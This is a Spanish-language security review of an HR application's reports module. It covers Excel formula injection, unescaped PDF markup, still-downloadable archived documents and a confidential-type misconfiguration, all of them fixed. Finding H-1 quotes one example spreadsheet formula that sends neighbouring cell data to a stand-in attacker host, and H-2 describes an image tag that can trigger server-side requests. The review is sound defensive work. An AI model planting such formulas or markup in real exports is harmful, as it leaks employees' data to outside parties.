# Revisión de seguridad — Módulo de reportes (y hallazgos sobre expedientes)

- **Fecha:** 2026-09-27
- **Alcance:** `apps/reports` completo; decoradores de rol de `apps/accounts`; comando `seed_demo`; y los hallazgos sobre `apps/documents` que aparecieron al revisar quién consume sus selectores
- **Checklist aplicado:** [§K.9](11-seguridad.md#k9-revisión-de-seguridad-por-fase)
- **Resultado:** **aprobada**, con cuatro hallazgos corregidos y una decisión pendiente del negocio

---

## Método

Se revisó en paralelo por áreas, y **cada hallazgo se verificó a mano contra el
comportamiento real de las bibliotecas** antes de aceptarlo. Eso descartó una
afirmación del análisis —que un `&` sin escapar rompía la generación del PDF—
que resultó falsa, y confirmó las otras dos sobre el mismo archivo.

El foco fue el que le corresponde a un módulo de reportes: **lo que sale del
sistema**. Un reporte agrega datos de varias apps y termina en un archivo que
viaja por correo; los dos riesgos propios son que muestre lo que no debe y que
el archivo haga algo en la máquina de quien lo abre.

---

## Hallazgos

### H-1 — Inyección de fórmulas en la exportación a Excel · **Alta** · corregido

Los textos se escribían tal cual en el libro, y openpyxl marca como **fórmula**
toda celda que empiece con `=`. Verificado: una celda con `=1+1` quedaba con
tipo `f`.

**Por qué importa quién puede escribir esos textos:** el título de un documento
lo escribe **la propia persona** al subir algo a su expediente, y ese título
sale en el reporte de expedientes. Un título como
`=HYPERLINK("https://atacante.example/?d="&B2,"Abrir")` se ejecuta al abrir el
libro en la máquina de RRHH y puede sacar el contenido de las celdas vecinas
—nombres y códigos de toda la organización— hacia una dirección ajena.

**Corrección:** el punto de escritura antepone un apóstrofo a cualquier texto
que empiece con `=`, `+`, `-`, `@`, tabulador o retorno. El apóstrofo no se ve
en la celda. Los importes y las fechas siguen yendo tipados, para que las sumas
de la hoja funcionen.
**Pruebas:** `reports/tests/test_export_safety.py`, incluida una que verifica
que los números **siguen siendo números**.

### H-2 — Marcado sin escapar en el PDF · **Media** · corregido

Las celdas del PDF se escapaban, pero el **título**, la **línea de filtros** y
la **firma** no. Un párrafo de ReportLab interpreta etiquetas: verificado que
`<img src="...">` hace que **el servidor** cargue ese recurso al construir el
PDF, y que `<a href>` incrusta enlaces.

**Alcance real:** quien puede disparar esto necesita poder nombrar un
departamento (`HR_ADMIN`), así que no es escalable por cualquiera. Aun así es
un primitivo de petición saliente desde el servidor —hacia una dirección
interna, por ejemplo— y una vía para incrustar enlaces en un documento que
circula fuera de la empresa.

**Corrección:** el mismo escape que ya tenían las celdas cubre ahora título,
filtros y firma.
**Prueba:** por contraste y sin salir a la red — el mismo texto **sin** escapar
hace reventar a ReportLab al intentar abrir el recurso; escapado, el PDF se
genera.

### H-3 — Un documento archivado seguía descargándose · **Media** · corregido

`get_document_or_404` alcanzaba también a los archivados, porque la pantalla de
archivado necesita poder decir «ya estaba archivado». La vista de descarga usaba
el mismo selector, así que **archivar no cortaba el acceso**: el enlace guardado
seguía entregando el archivo.

Es más grave de lo que parece porque archivar es la **única** forma de retirar un
documento del expediente (`delete_employeedocument` no se otorga nunca) y porque
la pantalla de confirmación se lo promete a quien archiva: «ya no se podrá
descargar desde la ficha». El sistema decía una cosa y hacía otra.

**Corrección:** el selector excluye los archivados por omisión; solo la pantalla
de archivado pide alcanzarlos.
**Prueba:** `test_an_archived_document_can_no_longer_be_downloaded` descarga
antes, archiva, y comprueba que después responde 404.

### H-4 — Un tipo confidencial podía quedar al alcance de la persona · **Baja** · corregido

`uploadable_types_for` filtraba por «la persona puede subirlo» sin excluir los
confidenciales. Un tipo marcado con ambas cosas en el catálogo habría permitido
que alguien subiera a la parte reservada de su propio expediente algo que
después no podría volver a abrir. No existe tal tipo hoy: era un riesgo de
configuración, no un agujero abierto.

**Corrección:** la rama de autoservicio excluye los tipos confidenciales.

### Corregido de paso

El ejemplo del docstring de `role_required` usaba `HR_ADMIN` junto a `AUDITOR`
para una consola de auditoría, justo lo que §J.2 prohíbe: quien opera el sistema
no revisa la bitácora que lo vigila. Copiar ese ejemplo habría roto la
separación de funciones.

---

## Verificado sin hallazgo

| Qué se comprobó | Resultado |
|---|---|
| Tres capas en las vistas de reportes | Autenticación, permiso por reporte y alcance por selectores |
| Paridad de la exportación | `format=xlsx\|pdf` se resuelve **dentro** de la misma vista, tras el mismo permiso y el mismo cálculo: no hay segunda puerta |
| El filtro de departamento | Filtra **dentro** del alcance; pedir un área ajena devuelve vacío, no filas ajenas |
| Salarios | Ningún reporte incluye importes |
| Documentos confidenciales en reportes | El título se enmascara con el mismo `can_open` de la ficha |
| `Content-Disposition` | El nombre se arma con un slug validado y fechas: sin comillas ni saltos de línea |
| QR y `build_absolute_uri` | Ruta propia más los filtros ya codificados; el host lo gobierna `ALLOWED_HOSTS` |
| Decoradores de rol | Sin sesión redirigen; rol insuficiente da 403; apilados con `permission_required` exigen ambas cosas; `AUDITOR` no gana escritura |
| `seed_demo` | Sin contraseñas utilizables, sin privilegios elevados, no alcanzable por web y ausente en producción |

---

## Decisión pendiente del negocio

| # | Pregunta | Por qué importa |
|---|---|---|
| P-1 | **¿El reporte de ausencias debe ocultar los tipos sensibles a quien no es RRHH?** Hoy los muestra: una jefatura puede listar y exportar quién estuvo de incapacidad o de duelo en su área | El calendario sí los oculta (ADR-022 §3), pero esa decisión se escribió para el calendario. Un reporte exportable saca ese dato del sistema en un archivo. La jefatura ya ve el tipo cuando **decide** una solicitud, así que no es información nueva para ella: la diferencia es el volumen y que sale en un archivo |

---

## Riesgos abiertos

| Riesgo | Estado |
|---|---|
| Sin antivirus en la subida de documentos | Desviación aceptada en la Fase 7; sigue vigente |
| La entrega de archivos la hace la aplicación, no el servidor web | Desviación aceptada en la Fase 7 |
| Política de retención de documentos | Pendiente de decisión del negocio |
| Tareas programadas, `MINIMUM_MONTHLY_SALARY`, algoritmo del NIT | Heredados; siguen siendo bloqueantes |
